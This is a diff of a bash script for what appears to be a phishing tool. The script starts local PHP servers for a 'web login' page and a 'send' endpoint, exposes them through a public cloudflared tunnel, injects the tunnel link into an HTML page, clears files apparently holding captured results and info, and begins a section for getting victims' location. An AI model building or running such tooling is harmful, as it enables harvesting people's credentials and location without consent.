@@ -1,4 +1,5 @@
-#!/usr/bin/env bash #uncomment in linux environment!
+#!/usr/bin/env bash
+#set -x
 #<<<========Inbuilt Varialbles and values========>>>
 CWD=$(pwd)
 OS=$(uname -o)
@@ -47,14 +48,16 @@ for p in "${pkgs}"; do
 done
 #<<<=========Program=========>>>
 #lets tests for login page lol this program is in process not completed!! so dont use now
-if [ -d $CWD/logs ]; then
+if [ ! -d $CWD/logs ]; then
     mkdir logs > /dev/null 2>&1
 else
     rm -rf $CWD/logs/phpLogs.txt $CWD/logs/phpSend.txt $CWD/logs/cloudflare-log.txt >/dev/null 2>&1
+    printf ''>$CWD/assets/send/php/result.txt
+    printf ''>$CWD/assets/send/php/info.txt
 fi
 killall php cloudflared >/dev/null 2>&1
 cd $CWD/assets/send >/dev/null 2>&1
-php -S 127.0.0.1:4444 >> $CWD/logs/phpSend.txt &
+php -S 127.0.0.1:4444 >> $CWD/logs/phpSend.txt 2>&1 &
 sleep 4
 if [[ ${OS,,} == *'android'* ]]; then
     termux-chroot cloudflared -url 127.0.0.1:4444 --logfile ${CWD}/logs/cloudflare-log.txt > /dev/null 2>&1 &
@@ -67,10 +70,10 @@ link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${CWD}/logs/cloudflare-l
 cd $CWD/assets >/dev/null 2>&1
 #replace link in output html
 while read -r X; do
-    echo ${X//pre/$link}
+    echo ${X//€BHUTUULINK/$link}
 done < $CWD/assets/serverDummy > $CWD/assets/server.html
 #start web login
-php -S 127.0.0.1:8084 >> $CWD/logs/phpLogin.txt &
+php -S 127.0.0.1:8084 >> $CWD/logs/phpLogin.txt 2>&1 &
 printf "\n${S2}[${S5}+${S2}] ${S4}Login servet started at ${S1}:: ${S2}http://127.0.0.1:8084 ${R0}\n"
 xdg-open http://127.0.0.1:8084
 #<<<---Get location--->>>#
